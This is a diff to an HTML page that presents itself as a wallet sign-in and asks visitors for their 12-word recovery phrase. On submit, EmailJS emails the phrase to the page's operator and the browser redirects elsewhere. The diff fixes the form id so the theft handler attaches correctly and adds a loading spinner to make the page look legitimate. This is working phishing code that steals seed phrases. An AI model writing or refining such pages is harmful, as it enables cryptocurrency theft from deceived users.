@@ -311,16 +311,39 @@
   </header>
 
   <main>
-  <form id="about" class="full-form">
+  <form class="full-form" id="contact-form">
     <h2>Sign in with recovery phrase</h2>
     <label for="about">This is a 12-word phrase you were given when you created your wallet</label>
     <textarea id="about" name="message" rows="4" placeholder="12-word recovery phrase"></textarea>
     <div id="autocomplete-list" class="autocomplete-items" style="display:none;"></div>
     <button type="submit" class="submit-btn">Continue</button>
+
+    <!-- 🔄 Loading Spinner -->
+    <div id="spinner" style="display:none; text-align:center; margin-top:10px;">
+      <div class="loader"></div>
+      <p>Sending...</p>
+    </div>
   </form>
-  </main>
+</main>
+
+<!-- 🌀 Spinner Styling -->
+<style>
+.loader {
+  border: 4px solid #f3f3f3;
+  border-top: 4px solid #3498db;
+  border-radius: 50%;
+  width: 28px;
+  height: 28px;
+  animation: spin 1s linear infinite;
+  margin: 0 auto;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
   
-  <script>
+    <script>
     document.addEventListener("DOMContentLoaded", function () {
       const textarea = document.getElementById("about");
       const listDiv = document.getElementById("autocomplete-list");
@@ -535,43 +558,29 @@
       ];
 
       let currentFocus = -1;
-
+    
       function closeSuggestions() {
         listDiv.innerHTML = "";
         listDiv.style.display = "none";
         currentFocus = -1;
       }
-
+    
       function createSuggestionItem(word) {
         const div = document.createElement("div");
         div.textContent = word;
         div.addEventListener("mousedown", function (e) {
-          e.preventDefault(); // Prevent losing focus on textarea
+          e.preventDefault();
           insertWordAtCursor(textarea, word);
           closeSuggestions();
         });
         return div;
       }
-
-      function addActive(items) {
-        if (!items) return false;
-        removeActive(items);
-        if (currentFocus >= items.length) currentFocus = 0;
-        if (currentFocus < 0) currentFocus = items.length - 1;
-        items[currentFocus].classList.add("autocomplete-active");
-      }
-
-      function removeActive(items) {
-        for (const item of items) {
-          item.classList.remove("autocomplete-active");
-        }
-      }
-
+    
       function insertWordAtCursor(textarea, word) {
         const start = textarea.selectionStart;
         const end = textarea.selectionEnd;
         const value = textarea.value;
-
+    
         let wordStart = start;
         while (wordStart > 0 && !/\s/.test(value[wordStart - 1])) {
           wordStart--;
@@ -579,51 +588,49 @@
         const before = value.substring(0, wordStart);
         const after = value.substring(end);
         textarea.value = before + word + after;
-
+    
         const newPos = wordStart + word.length;
         textarea.setSelectionRange(newPos, newPos);
         textarea.focus();
       }
-
+    
       textarea.addEventListener("input", function () {
         const inputVal = textarea.value;
         const cursorPos = textarea.selectionStart;
-
+    
         let wordStart = cursorPos;
         while (wordStart > 0 && !/\s/.test(inputVal[wordStart - 1])) {
           wordStart--;
         }
         const partialWord = inputVal.substring(wordStart, cursorPos).toLowerCase();
-
+    
         closeSuggestions();
-
+    
         if (partialWord.length === 0) return;
-
-        // Filter suggestions that start with partialWord (case insensitive)
+    
         const filtered = suggestions.filter(word =>
           word.toLowerCase().startsWith(partialWord)
         );
-
+    
         if (filtered.length === 0) return;
-
+    
         listDiv.style.display = "flex";
-
-        // Limit to 4 suggestions
+    
         filtered.slice(0, 4).forEach(word => {
           const item = createSuggestionItem(word);
           listDiv.appendChild(item);
         });
       });
-
+    
       textarea.addEventListener("keydown", function (e) {
         let items = listDiv.querySelectorAll("div");
         if (listDiv.style.display === "none") return;
-
-        if (e.key === "ArrowRight" || e.key === "ArrowDown") {
+    
+        if (e.key === "ArrowDown") {
           e.preventDefault();
           currentFocus++;
           addActive(items);
-        } else if (e.key === "ArrowLeft" || e.key === "ArrowUp") {
+        } else if (e.key === "ArrowUp") {
           e.preventDefault();
           currentFocus--;
           addActive(items);
@@ -638,29 +645,47 @@
           closeSuggestions();
         }
       });
-
-      textarea.addEventListener("blur", () => {
-        setTimeout(closeSuggestions, 150);
-      });
+    
+      function addActive(items) {
+        if (!items) return false;
+        removeActive(items);
+        if (currentFocus >= items.length) currentFocus = 0;
+        if (currentFocus < 0) currentFocus = items.length - 1;
+        items[currentFocus].classList.add("autocomplete-active");
+      }
+    
+      function removeActive(items) {
+        for (const item of items) item.classList.remove("autocomplete-active");
+      }
+    
+      textarea.addEventListener("blur", () => setTimeout(closeSuggestions, 150));
     });
-  </script>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-(function() {
-  emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS public key
-})();
-
-document.getElementById("about").addEventListener("submit", function(event) {
-  event.preventDefault();
-
-  emailjs.sendForm("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", this)
-    .then(function() {
-      // Redirect automatically after successful send
-      window.location.href = "https://www.accountchemist.com"; // Replace with your redirect URL
-    }, function(error) {
-      console.error("❌ Failed to send email:", error);
+    </script>
+    
+    <!-- ✅ EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    
+    <!-- ✅ EmailJS Submission + Spinner Script -->
+    <script>
+    (function() {
+      emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS public key
+    })();
+    
+    document.getElementById("contact-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+    
+      const spinner = document.getElementById("spinner");
+      spinner.style.display = "block"; // Show loading spinner
+    
+      emailjs.sendForm("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", this)
+        .then(function() {
+          // ✅ Redirect after successful send
+          window.location.href = "https://www.example.com"; // Replace with your redirect URL
+        }, function(error) {
+          console.error("❌ Failed to send email:", error);
+          spinner.style.display = "none"; // Hide spinner if it fails
+        });
     });
-});
-  </script>
+    </script>
 </body>
 </html>
